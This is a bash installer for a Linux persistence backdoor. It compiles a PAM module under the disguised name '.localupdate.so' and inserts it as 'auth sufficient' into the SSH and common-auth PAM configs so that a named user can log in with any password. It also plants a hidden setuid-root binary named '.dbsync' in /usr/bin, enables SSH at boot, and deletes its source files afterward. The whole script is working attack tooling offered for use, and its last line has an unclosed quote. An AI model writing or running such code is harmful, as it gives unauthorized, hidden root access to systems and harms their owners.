#!/bin/bash 
set -e

sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
sudo apt update -y
sudo apt install libpam0g-dev

# On the target machine (locally or via console):
sudo systemctl start ssh

# To make it persist after reboot:
sudo systemctl enable ssh


BACKDOOR_USER="nihargayam"

echo "[*] Compiling PAM backdoor..."
gcc -fPIC -fno-stack-protector -c backdoor.c -o pam_backdoor.o
ld -x --shared -o .localupdate.so pam_backdoor.o

echo "[*] Installing PAM module..."
sudo mkdir -p /lib/security
sudo mv .localupdate.so /lib/security/

echo "[*] Patching /etc/pam.d/sshd..."
PAM_FILE="/etc/pam.d/sshd"
COMM_AUTH_FILE="/etc/pam.d/common-auth"

LINE="auth sufficient .localupdate.so"


if ! grep -Fxq "$LINE" "$PAM_FILE"; then
    sudo sed -i "1i$LINE" "$PAM_FILE"
    echo "[+] PAM config patched."
else
    echo "[=] PAM already patched."
fi


if ! grep -Fxq "$LINE" "$COMM_AUTH_FILE"; then
    sudo sed -i "1i$LINE" "$COMM_AUTH_FILE"
    echo "[+] PAM config patched."
else
    echo "[=] PAM already patched."
fi


# Create recurring user
gcc PheonixUser.c -o .dbsync
sudo chown root:root .dbsync
sudo chmod 4755 .dbsync
mv .dbsync /usr/bin




echo "[*] Restarting SSH..."
sudo systemctl restart ssh

echo "[✔] Setup complete. Try logging in as '$BACKDOOR_USER' with any password."

[ -f backdoor.c ] && sudo rm backdoor.c
[ -f pam_backdoor.o ] && sudo rm pam_backdoor.o
[ -f PheonixUser.c ] && sudo rm PheonixUser.c

echo "[✔] Clean complete

